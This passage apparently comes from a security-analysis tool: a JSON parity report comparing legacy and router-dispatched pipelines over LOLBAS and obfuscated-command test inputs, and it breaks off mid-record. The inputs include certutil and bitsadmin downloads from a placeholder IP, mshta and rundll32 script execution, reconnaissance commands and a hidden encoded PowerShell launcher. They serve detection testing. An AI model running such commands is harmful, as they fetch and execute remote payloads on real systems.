@@ -1,0 +1,1949 @@
+{
+  "overall_verdict": "GAPS-REQUIRE-MIGRATION",
+  "records": [
+    {
+      "differences": {
+        "duplicate_execution": [],
+        "expected_additive": [],
+        "expected_structural": [
+          {
+            "axis": "call graph",
+            "legacy": "analyze() \u2192 generate_report()",
+            "note": "router path decomposes the pipeline; legacy is 2 inline calls",
+            "router": "2 router-dispatched successes over 2 steps"
+          },
+          {
+            "axis": "unmapped legacy engines (class-B bundled)",
+            "note": "these stages run inside die.command.v1 or report.narrative.v1 as sub-behaviour (per ADR-0014d classification)",
+            "unmapped": [
+              "DKP (Decoder Knowledge Pack)",
+              "Attack Intent"
+            ]
+          }
+        ],
+        "failure_semantics": [],
+        "identical": [
+          {
+            "axis": "die.command.v1 envelope",
+            "hash": "11f7c4e375eef9058ad82929dcea16afa8321061d8fb356c81c5cef053182d09",
+            "note": "router-dispatched invocation is byte-identical to inline"
+          },
+          {
+            "axis": "report.narrative.v1 output",
+            "hash": "792a1ca703f54e33bb2533ebd8c323df4ab872289922f1e5446a2463aae8d009"
+          }
+        ],
+        "missing_capability": [
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s00_die_command_v1"
+          },
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s03_report_narrative_v1"
+          }
+        ],
+        "ordering": [
+          {
+            "axis": "execution order",
+            "legacy": [
+              "analyze",
+              "generate_report"
+            ],
+            "router": [
+              "s00_die_command_v1",
+              "s03_report_narrative_v1"
+            ]
+          }
+        ],
+        "unexpected": []
+      },
+      "input": {
+        "iue_engines_selected": [
+          "DIE (Semantic AST)",
+          "DKP (Decoder Knowledge Pack)",
+          "Attack Intent",
+          "Report Generator"
+        ],
+        "name": "lolbas_certutil_download",
+        "text_head": "certutil.exe -urlcache -split -f http://198.51.100.20/payload.exe %TEMP%\\a.exe"
+      },
+      "legacy": {
+        "envelope_hash": "11f7c4e375eef9058ad82929dcea16afa8321061d8fb356c81c5cef053182d09",
+        "envelope_keys": [
+          "ast",
+          "attack_intent",
+          "cmdlets",
+          "dkp_matches",
+          "iocs",
+          "iocs_summary",
+          "language",
+          "lolbins",
+          "obfuscation_score",
+          "preprocessor",
+          "techniques"
+        ],
+        "report_hash": "792a1ca703f54e33bb2533ebd8c323df4ab872289922f1e5446a2463aae8d009",
+        "report_section_titles": [
+          "Executive Summary",
+          "Overall Assessment",
+          "Behavior Summary",
+          "Attack Story",
+          "Recovered Artifacts",
+          "Technical Findings",
+          "MITRE Coverage",
+          "Attack Intent",
+          "Evidence Summary",
+          "Detection Opportunities",
+          "Recommendations",
+          "Confidence Summary"
+        ]
+      },
+      "router": {
+        "outcomes": [
+          {
+            "entry_id": "die.command.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.api:analyze",
+            "result_hash": "11f7c4e375eef9058ad82929dcea16afa8321061d8fb356c81c5cef053182d09",
+            "status": "success",
+            "step_id": "s00_die_command_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.narrative:generate_report",
+            "result_hash": "792a1ca703f54e33bb2533ebd8c323df4ab872289922f1e5446a2463aae8d009",
+            "status": "success",
+            "step_id": "s03_report_narrative_v1"
+          }
+        ],
+        "plumbing_gaps": [
+          {
+            "entry_id": "die.command.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s00_die_command_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s03_report_narrative_v1"
+          }
+        ],
+        "projected_steps": [
+          [
+            "s00_die_command_v1",
+            "die.command.v1"
+          ],
+          [
+            "s03_report_narrative_v1",
+            "report.narrative.v1"
+          ]
+        ],
+        "unmapped_engines": [
+          "DKP (Decoder Knowledge Pack)",
+          "Attack Intent"
+        ]
+      },
+      "verdict": "GAPS-REQUIRE-MIGRATION"
+    },
+    {
+      "differences": {
+        "duplicate_execution": [],
+        "expected_additive": [],
+        "expected_structural": [
+          {
+            "axis": "call graph",
+            "legacy": "analyze() \u2192 generate_report()",
+            "note": "router path decomposes the pipeline; legacy is 2 inline calls",
+            "router": "2 router-dispatched successes over 2 steps"
+          },
+          {
+            "axis": "unmapped legacy engines (class-B bundled)",
+            "note": "these stages run inside die.command.v1 or report.narrative.v1 as sub-behaviour (per ADR-0014d classification)",
+            "unmapped": [
+              "DKP (Decoder Knowledge Pack)",
+              "Attack Intent"
+            ]
+          }
+        ],
+        "failure_semantics": [],
+        "identical": [
+          {
+            "axis": "die.command.v1 envelope",
+            "hash": "a2a822c49c921e952ac339e88d3def91b0a23715890c98bcaa5a8ed58bcab016",
+            "note": "router-dispatched invocation is byte-identical to inline"
+          },
+          {
+            "axis": "report.narrative.v1 output",
+            "hash": "51542f7582de3c3f26d0f6ffbdfea79e865ece081114a45865ee3fbca2ef6de7"
+          }
+        ],
+        "missing_capability": [
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s00_die_command_v1"
+          },
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s03_report_narrative_v1"
+          }
+        ],
+        "ordering": [
+          {
+            "axis": "execution order",
+            "legacy": [
+              "analyze",
+              "generate_report"
+            ],
+            "router": [
+              "s00_die_command_v1",
+              "s03_report_narrative_v1"
+            ]
+          }
+        ],
+        "unexpected": []
+      },
+      "input": {
+        "iue_engines_selected": [
+          "DIE (Semantic AST)",
+          "DKP (Decoder Knowledge Pack)",
+          "Attack Intent",
+          "Report Generator"
+        ],
+        "name": "lolbas_bitsadmin_transfer",
+        "text_head": "bitsadmin /transfer j http://198.51.100.20/ps.txt %APPDATA%\\p.ps1"
+      },
+      "legacy": {
+        "envelope_hash": "a2a822c49c921e952ac339e88d3def91b0a23715890c98bcaa5a8ed58bcab016",
+        "envelope_keys": [
+          "ast",
+          "attack_intent",
+          "cmdlets",
+          "dkp_matches",
+          "iocs",
+          "iocs_summary",
+          "language",
+          "lolbins",
+          "obfuscation_score",
+          "preprocessor",
+          "techniques"
+        ],
+        "report_hash": "51542f7582de3c3f26d0f6ffbdfea79e865ece081114a45865ee3fbca2ef6de7",
+        "report_section_titles": [
+          "Executive Summary",
+          "Overall Assessment",
+          "Behavior Summary",
+          "Attack Story",
+          "Recovered Artifacts",
+          "Technical Findings",
+          "MITRE Coverage",
+          "Attack Intent",
+          "Evidence Summary",
+          "Detection Opportunities",
+          "Recommendations",
+          "Confidence Summary"
+        ]
+      },
+      "router": {
+        "outcomes": [
+          {
+            "entry_id": "die.command.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.api:analyze",
+            "result_hash": "a2a822c49c921e952ac339e88d3def91b0a23715890c98bcaa5a8ed58bcab016",
+            "status": "success",
+            "step_id": "s00_die_command_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.narrative:generate_report",
+            "result_hash": "51542f7582de3c3f26d0f6ffbdfea79e865ece081114a45865ee3fbca2ef6de7",
+            "status": "success",
+            "step_id": "s03_report_narrative_v1"
+          }
+        ],
+        "plumbing_gaps": [
+          {
+            "entry_id": "die.command.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s00_die_command_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s03_report_narrative_v1"
+          }
+        ],
+        "projected_steps": [
+          [
+            "s00_die_command_v1",
+            "die.command.v1"
+          ],
+          [
+            "s03_report_narrative_v1",
+            "report.narrative.v1"
+          ]
+        ],
+        "unmapped_engines": [
+          "DKP (Decoder Knowledge Pack)",
+          "Attack Intent"
+        ]
+      },
+      "verdict": "GAPS-REQUIRE-MIGRATION"
+    },
+    {
+      "differences": {
+        "duplicate_execution": [],
+        "expected_additive": [],
+        "expected_structural": [
+          {
+            "axis": "call graph",
+            "legacy": "analyze() \u2192 generate_report()",
+            "note": "router path decomposes the pipeline; legacy is 2 inline calls",
+            "router": "2 router-dispatched successes over 2 steps"
+          },
+          {
+            "axis": "unmapped legacy engines (class-B bundled)",
+            "note": "these stages run inside die.command.v1 or report.narrative.v1 as sub-behaviour (per ADR-0014d classification)",
+            "unmapped": [
+              "Preprocessor",
+              "Chain Analyzer",
+              "DKP (Decoder Knowledge Pack)",
+              "Attack Intent",
+              "Attack Story"
+            ]
+          }
+        ],
+        "failure_semantics": [],
+        "identical": [
+          {
+            "axis": "die.command.v1 envelope",
+            "hash": "6e9a5d8a81210019996222c5c049e4802d1d0a16241388cd783a3bb293c081b7",
+            "note": "router-dispatched invocation is byte-identical to inline"
+          },
+          {
+            "axis": "report.narrative.v1 output",
+            "hash": "6d0042ffb52870cdbb33f8c65a4c3eb0032d0e271d0fb5551be21e04931c44e4"
+          }
+        ],
+        "missing_capability": [
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s02_die_command_v1"
+          },
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s06_report_narrative_v1"
+          }
+        ],
+        "ordering": [
+          {
+            "axis": "execution order",
+            "legacy": [
+              "analyze",
+              "generate_report"
+            ],
+            "router": [
+              "s02_die_command_v1",
+              "s06_report_narrative_v1"
+            ]
+          }
+        ],
+        "unexpected": []
+      },
+      "input": {
+        "iue_engines_selected": [
+          "Preprocessor",
+          "Chain Analyzer",
+          "DIE (Semantic AST)",
+          "DKP (Decoder Knowledge Pack)",
+          "Attack Intent",
+          "Attack Story",
+          "Report Generator"
+        ],
+        "name": "lolbas_mshta_javascript",
+        "text_head": "mshta.exe javascript:a=new%20ActiveXObject(\"WScript.Shell\");a.Run(\"calc.exe\");cl"
+      },
+      "legacy": {
+        "envelope_hash": "6e9a5d8a81210019996222c5c049e4802d1d0a16241388cd783a3bb293c081b7",
+        "envelope_keys": [
+          "ast",
+          "chain",
+          "cmdlets",
+          "dkp_matches",
+          "iocs",
+          "iocs_summary",
+          "language",
+          "lolbins",
+          "obfuscation_score",
+          "techniques"
+        ],
+        "report_hash": "6d0042ffb52870cdbb33f8c65a4c3eb0032d0e271d0fb5551be21e04931c44e4",
+        "report_section_titles": [
+          "Executive Summary",
+          "Overall Assessment",
+          "Behavior Summary",
+          "Attack Story",
+          "Recovered Artifacts",
+          "Technical Findings",
+          "MITRE Coverage",
+          "Attack Intent",
+          "Evidence Summary",
+          "Detection Opportunities",
+          "Recommendations",
+          "Confidence Summary"
+        ]
+      },
+      "router": {
+        "outcomes": [
+          {
+            "entry_id": "die.command.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.api:analyze",
+            "result_hash": "6e9a5d8a81210019996222c5c049e4802d1d0a16241388cd783a3bb293c081b7",
+            "status": "success",
+            "step_id": "s02_die_command_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.narrative:generate_report",
+            "result_hash": "6d0042ffb52870cdbb33f8c65a4c3eb0032d0e271d0fb5551be21e04931c44e4",
+            "status": "success",
+            "step_id": "s06_report_narrative_v1"
+          }
+        ],
+        "plumbing_gaps": [
+          {
+            "entry_id": "die.command.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s02_die_command_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s06_report_narrative_v1"
+          }
+        ],
+        "projected_steps": [
+          [
+            "s02_die_command_v1",
+            "die.command.v1"
+          ],
+          [
+            "s06_report_narrative_v1",
+            "report.narrative.v1"
+          ]
+        ],
+        "unmapped_engines": [
+          "Preprocessor",
+          "Chain Analyzer",
+          "DKP (Decoder Knowledge Pack)",
+          "Attack Intent",
+          "Attack Story"
+        ]
+      },
+      "verdict": "GAPS-REQUIRE-MIGRATION"
+    },
+    {
+      "differences": {
+        "duplicate_execution": [],
+        "expected_additive": [],
+        "expected_structural": [
+          {
+            "axis": "call graph",
+            "legacy": "analyze() \u2192 generate_report()",
+            "note": "router path decomposes the pipeline; legacy is 2 inline calls",
+            "router": "2 router-dispatched successes over 2 steps"
+          },
+          {
+            "axis": "unmapped legacy engines (class-B bundled)",
+            "note": "these stages run inside die.command.v1 or report.narrative.v1 as sub-behaviour (per ADR-0014d classification)",
+            "unmapped": [
+              "Preprocessor",
+              "Chain Analyzer",
+              "DKP (Decoder Knowledge Pack)",
+              "Attack Intent",
+              "Attack Story"
+            ]
+          }
+        ],
+        "failure_semantics": [],
+        "identical": [
+          {
+            "axis": "die.command.v1 envelope",
+            "hash": "94ef924ad8604045f4c834245cc53748008ccc6d56661a572e624a9694186a23",
+            "note": "router-dispatched invocation is byte-identical to inline"
+          },
+          {
+            "axis": "report.narrative.v1 output",
+            "hash": "03b7f5820d6db7731f9c21e8e435de44eba12f4a624e27239774e6e0aab37c7c"
+          }
+        ],
+        "missing_capability": [
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s02_die_command_v1"
+          },
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s06_report_narrative_v1"
+          }
+        ],
+        "ordering": [
+          {
+            "axis": "execution order",
+            "legacy": [
+              "analyze",
+              "generate_report"
+            ],
+            "router": [
+              "s02_die_command_v1",
+              "s06_report_narrative_v1"
+            ]
+          }
+        ],
+        "unexpected": []
+      },
+      "input": {
+        "iue_engines_selected": [
+          "Preprocessor",
+          "Chain Analyzer",
+          "DIE (Semantic AST)",
+          "DKP (Decoder Knowledge Pack)",
+          "Attack Intent",
+          "Attack Story",
+          "Report Generator"
+        ],
+        "name": "lolbas_rundll32_javascript",
+        "text_head": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20"
+      },
+      "legacy": {
+        "envelope_hash": "94ef924ad8604045f4c834245cc53748008ccc6d56661a572e624a9694186a23",
+        "envelope_keys": [
+          "ast",
+          "chain",
+          "cmdlets",
+          "dkp_matches",
+          "iocs",
+          "iocs_summary",
+          "language",
+          "lolbins",
+          "obfuscation_score",
+          "techniques"
+        ],
+        "report_hash": "03b7f5820d6db7731f9c21e8e435de44eba12f4a624e27239774e6e0aab37c7c",
+        "report_section_titles": [
+          "Executive Summary",
+          "Overall Assessment",
+          "Behavior Summary",
+          "Attack Story",
+          "Recovered Artifacts",
+          "Technical Findings",
+          "MITRE Coverage",
+          "Attack Intent",
+          "Evidence Summary",
+          "Detection Opportunities",
+          "Recommendations",
+          "Confidence Summary"
+        ]
+      },
+      "router": {
+        "outcomes": [
+          {
+            "entry_id": "die.command.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.api:analyze",
+            "result_hash": "94ef924ad8604045f4c834245cc53748008ccc6d56661a572e624a9694186a23",
+            "status": "success",
+            "step_id": "s02_die_command_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.narrative:generate_report",
+            "result_hash": "03b7f5820d6db7731f9c21e8e435de44eba12f4a624e27239774e6e0aab37c7c",
+            "status": "success",
+            "step_id": "s06_report_narrative_v1"
+          }
+        ],
+        "plumbing_gaps": [
+          {
+            "entry_id": "die.command.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s02_die_command_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s06_report_narrative_v1"
+          }
+        ],
+        "projected_steps": [
+          [
+            "s02_die_command_v1",
+            "die.command.v1"
+          ],
+          [
+            "s06_report_narrative_v1",
+            "report.narrative.v1"
+          ]
+        ],
+        "unmapped_engines": [
+          "Preprocessor",
+          "Chain Analyzer",
+          "DKP (Decoder Knowledge Pack)",
+          "Attack Intent",
+          "Attack Story"
+        ]
+      },
+      "verdict": "GAPS-REQUIRE-MIGRATION"
+    },
+    {
+      "differences": {
+        "duplicate_execution": [],
+        "expected_additive": [],
+        "expected_structural": [
+          {
+            "axis": "call graph",
+            "legacy": "analyze() \u2192 generate_report()",
+            "note": "router path decomposes the pipeline; legacy is 2 inline calls",
+            "router": "2 router-dispatched successes over 2 steps"
+          },
+          {
+            "axis": "unmapped legacy engines (class-B bundled)",
+            "note": "these stages run inside die.command.v1 or report.narrative.v1 as sub-behaviour (per ADR-0014d classification)",
+            "unmapped": [
+              "Preprocessor",
+              "Chain Analyzer",
+              "DKP (Decoder Knowledge Pack)",
+              "Attack Intent",
+              "Attack Story"
+            ]
+          }
+        ],
+        "failure_semantics": [],
+        "identical": [
+          {
+            "axis": "die.command.v1 envelope",
+            "hash": "ba63f4f53b54eed6c23130ba3923e8d445cf50642ad2fd32ff74657cc9b91785",
+            "note": "router-dispatched invocation is byte-identical to inline"
+          },
+          {
+            "axis": "report.narrative.v1 output",
+            "hash": "2fb65541e5d9ec1de7b3a58c952ac70819af60f1c60b31d1aaf1b5b14eff23af"
+          }
+        ],
+        "missing_capability": [
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s02_die_command_v1"
+          },
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s06_report_narrative_v1"
+          }
+        ],
+        "ordering": [
+          {
+            "axis": "execution order",
+            "legacy": [
+              "analyze",
+              "generate_report"
+            ],
+            "router": [
+              "s02_die_command_v1",
+              "s06_report_narrative_v1"
+            ]
+          }
+        ],
+        "unexpected": []
+      },
+      "input": {
+        "iue_engines_selected": [
+          "Preprocessor",
+          "Chain Analyzer",
+          "DIE (Semantic AST)",
+          "DKP (Decoder Knowledge Pack)",
+          "Attack Intent",
+          "Attack Story",
+          "Report Generator"
+        ],
+        "name": "cmd_chain_amp",
+        "text_head": "whoami && net user && ipconfig /all"
+      },
+      "legacy": {
+        "envelope_hash": "ba63f4f53b54eed6c23130ba3923e8d445cf50642ad2fd32ff74657cc9b91785",
+        "envelope_keys": [
+          "ast",
+          "chain",
+          "cmdlets",
+          "dkp_matches",
+          "iocs",
+          "iocs_summary",
+          "language",
+          "lolbins",
+          "obfuscation_score",
+          "preprocessor",
+          "techniques"
+        ],
+        "report_hash": "2fb65541e5d9ec1de7b3a58c952ac70819af60f1c60b31d1aaf1b5b14eff23af",
+        "report_section_titles": [
+          "Executive Summary",
+          "Overall Assessment",
+          "Behavior Summary",
+          "Attack Story",
+          "Recovered Artifacts",
+          "Technical Findings",
+          "MITRE Coverage",
+          "Attack Intent",
+          "Evidence Summary",
+          "Detection Opportunities",
+          "Recommendations",
+          "Confidence Summary"
+        ]
+      },
+      "router": {
+        "outcomes": [
+          {
+            "entry_id": "die.command.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.api:analyze",
+            "result_hash": "ba63f4f53b54eed6c23130ba3923e8d445cf50642ad2fd32ff74657cc9b91785",
+            "status": "success",
+            "step_id": "s02_die_command_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.narrative:generate_report",
+            "result_hash": "2fb65541e5d9ec1de7b3a58c952ac70819af60f1c60b31d1aaf1b5b14eff23af",
+            "status": "success",
+            "step_id": "s06_report_narrative_v1"
+          }
+        ],
+        "plumbing_gaps": [
+          {
+            "entry_id": "die.command.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s02_die_command_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s06_report_narrative_v1"
+          }
+        ],
+        "projected_steps": [
+          [
+            "s02_die_command_v1",
+            "die.command.v1"
+          ],
+          [
+            "s06_report_narrative_v1",
+            "report.narrative.v1"
+          ]
+        ],
+        "unmapped_engines": [
+          "Preprocessor",
+          "Chain Analyzer",
+          "DKP (Decoder Knowledge Pack)",
+          "Attack Intent",
+          "Attack Story"
+        ]
+      },
+      "verdict": "GAPS-REQUIRE-MIGRATION"
+    },
+    {
+      "differences": {
+        "duplicate_execution": [],
+        "expected_additive": [],
+        "expected_structural": [
+          {
+            "axis": "call graph",
+            "legacy": "analyze() \u2192 generate_report()",
+            "note": "router path decomposes the pipeline; legacy is 2 inline calls",
+            "router": "4 router-dispatched successes over 4 steps"
+          },
+          {
+            "axis": "unmapped legacy engines (class-B bundled)",
+            "note": "these stages run inside die.command.v1 or report.narrative.v1 as sub-behaviour (per ADR-0014d classification)",
+            "unmapped": [
+              "DKP (Decoder Knowledge Pack)",
+              "Attack Intent",
+              "Attack Story",
+              "Investigation Confidence"
+            ]
+          },
+          {
+            "axis": "async dispatch (M0d-async-extension)",
+            "entry_id": "ioc_enrichment.v1",
+            "impl": "analysis_core:enrich_iocs",
+            "note": "callable is async; router awaited it via M0d-async-extension. Result captured is the real value, not a coroutine object.",
+            "step_id": "s07_ioc_enrichment_v1"
+          }
+        ],
+        "failure_semantics": [],
+        "identical": [
+          {
+            "axis": "die.command.v1 envelope",
+            "hash": "38b159e1837056aa7261283c6ddfddee4bcfb82acefd13cbb413521a7d4fd582",
+            "note": "router-dispatched invocation is byte-identical to inline"
+          },
+          {
+            "axis": "report.narrative.v1 output",
+            "hash": "2291f79eff29a7566e970791d5274cbd863d8cdf9a8da03686e6a55e0b276c50"
+          }
+        ],
+        "missing_capability": [
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s00_die_recursive_v1"
+          },
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s01_die_command_v1"
+          },
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s06_report_narrative_v1"
+          },
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s07_ioc_enrichment_v1"
+          }
+        ],
+        "ordering": [
+          {
+            "axis": "execution order",
+            "legacy": [
+              "analyze",
+              "generate_report"
+            ],
+            "router": [
+              "s00_die_recursive_v1",
+              "s01_die_command_v1",
+              "s06_report_narrative_v1",
+              "s07_ioc_enrichment_v1"
+            ]
+          }
+        ],
+        "unexpected": []
+      },
+      "input": {
+        "iue_engines_selected": [
+          "Decoder",
+          "DIE (Semantic AST)",
+          "DKP (Decoder Knowledge Pack)",
+          "Attack Intent",
+          "Attack Story",
+          "Investigation Confidence",
+          "Report Generator",
+          "IOC Enrichment"
+        ],
+        "name": "powershell_encoded_realistic",
+        "text_head": "powershell -nop -w hidden -EncodedCommand JABjAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAF"
+      },
+      "legacy": {
+        "envelope_hash": "38b159e1837056aa7261283c6ddfddee4bcfb82acefd13cbb413521a7d4fd582",
+        "envelope_keys": [
+          "ast",
+          "attack_intent",
+          "cmdlets",
+          "decoded_layers",
+          "dkp_matches",
+          "iocs",
+          "iocs_summary",
+          "language",
+          "lolbins",
+          "obfuscation_score",
+          "techniques"
+        ],
+        "report_hash": "2291f79eff29a7566e970791d5274cbd863d8cdf9a8da03686e6a55e0b276c50",
+        "report_section_titles": [
+          "Executive Summary",
+          "Overall Assessment",
+          "Behavior Summary",
+          "Attack Story",
+          "Recovered Artifacts",
+          "Technical Findings",
+          "MITRE Coverage",
+          "Attack Intent",
+          "Evidence Summary",
+          "Detection Opportunities",
+          "Recommendations",
+          "Confidence Summary"
+        ]
+      },
+      "router": {
+        "outcomes": [
+          {
+            "entry_id": "die.recursive.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.recursive_decode:extract_decoded_layers",
+            "result_hash": "1f190ee77b5d31aba142dcc43560f7f6d0fd59ffe3e69324134afa79ef11752a",
+            "status": "success",
+            "step_id": "s00_die_recursive_v1"
+          },
+          {
+            "entry_id": "die.command.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.api:analyze",
+            "result_hash": "38b159e1837056aa7261283c6ddfddee4bcfb82acefd13cbb413521a7d4fd582",
+            "status": "success",
+            "step_id": "s01_die_command_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "services.die.narrative:generate_report",
+            "result_hash": "2291f79eff29a7566e970791d5274cbd863d8cdf9a8da03686e6a55e0b276c50",
+            "status": "success",
+            "step_id": "s06_report_narrative_v1"
+          },
+          {
+            "entry_id": "ioc_enrichment.v1",
+            "error": null,
+            "error_type": null,
+            "implementation": "analysis_core:enrich_iocs",
+            "result_hash": "9319e13fed79d01378d23dba0a6cb5e7ef6a600826e6e6d10ddc90df9e429632",
+            "status": "success",
+            "step_id": "s07_ioc_enrichment_v1"
+          }
+        ],
+        "plumbing_gaps": [
+          {
+            "entry_id": "die.recursive.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s00_die_recursive_v1"
+          },
+          {
+            "entry_id": "die.command.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s01_die_command_v1"
+          },
+          {
+            "entry_id": "report.narrative.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s06_report_narrative_v1"
+          },
+          {
+            "entry_id": "ioc_enrichment.v1",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step_id": "s07_ioc_enrichment_v1"
+          }
+        ],
+        "projected_steps": [
+          [
+            "s00_die_recursive_v1",
+            "die.recursive.v1"
+          ],
+          [
+            "s01_die_command_v1",
+            "die.command.v1"
+          ],
+          [
+            "s06_report_narrative_v1",
+            "report.narrative.v1"
+          ],
+          [
+            "s07_ioc_enrichment_v1",
+            "ioc_enrichment.v1"
+          ]
+        ],
+        "unmapped_engines": [
+          "DKP (Decoder Knowledge Pack)",
+          "Attack Intent",
+          "Attack Story",
+          "Investigation Confidence"
+        ]
+      },
+      "verdict": "GAPS-REQUIRE-MIGRATION"
+    },
+    {
+      "differences": {
+        "duplicate_execution": [],
+        "expected_additive": [],
+        "expected_structural": [
+          {
+            "axis": "call graph",
+            "legacy": "analyze() \u2192 generate_report()",
+            "note": "router path decomposes the pipeline; legacy is 2 inline calls",
+            "router": "3 router-dispatched successes over 3 steps"
+          }
+        ],
+        "failure_semantics": [],
+        "identical": [
+          {
+            "axis": "die.command.v1 envelope",
+            "hash": "f06a2a309b1f9e952b3f8ff06cf729a52648d9fa3d56ecb4364a88d71ccbf6a9",
+            "note": "router-dispatched invocation is byte-identical to inline"
+          },
+          {
+            "axis": "report.narrative.v1 output",
+            "hash": "52440b079e4ca00d5c0d5cb9b0a9d4b2969c6ae308c60063cdc104184d29e5b3"
+          }
+        ],
+        "missing_capability": [
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s00_die_recursive_v1"
+          },
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s01_die_command_v1"
+          },
+          {
+            "axis": "router plumbing",
+            "note": "M0e projection emits inputs={}. Harness populated kwargs at execution time. Router has no output\u2192input pipe primitive today.",
+            "step": "s02_report_narrative_v1"
+          }
+        ],
+        "ordering": [
+          {
+            "axis": "execution order",
+            "legacy": [
+              "analyze",
+              "generate_report"
+            ],
+            "router": [
+              "s00_die_recursive_v1",
+              "s01_die_command_v1",
+              "s02_report_narrative_v1"
+            ]
+          }
+        ],
+        "unexpected": []
+      },
+      "input": {
+        "iue_engines_selected": [
+          "Decoder",
+          "DIE (Semantic AST)",
+          "Report Generator"
+        ],
+        "name": "base64_wrapping_iocs",
+        "text_head": "aHR0cDovL2V2aWwuZXhhbXBsZS5jb20vcGF5bG9hZC5leGUgZGVsaXZlcnMgYSByYW5zb213YXJl"
+      },
+      "legacy": {
+        "envelope_hash": "f06a2a309b1f9e952b3f8ff06cf729a52648d9fa3d56ecb4364a88d71ccbf6a9",
+        "envelope_keys": [
+          "ast",
+          "cmdlets",
+          "dkp_matches",
+          "iocs",
+          "iocs_summary",
+          "language",
+          "lolbins",
+          "obfuscation_score",
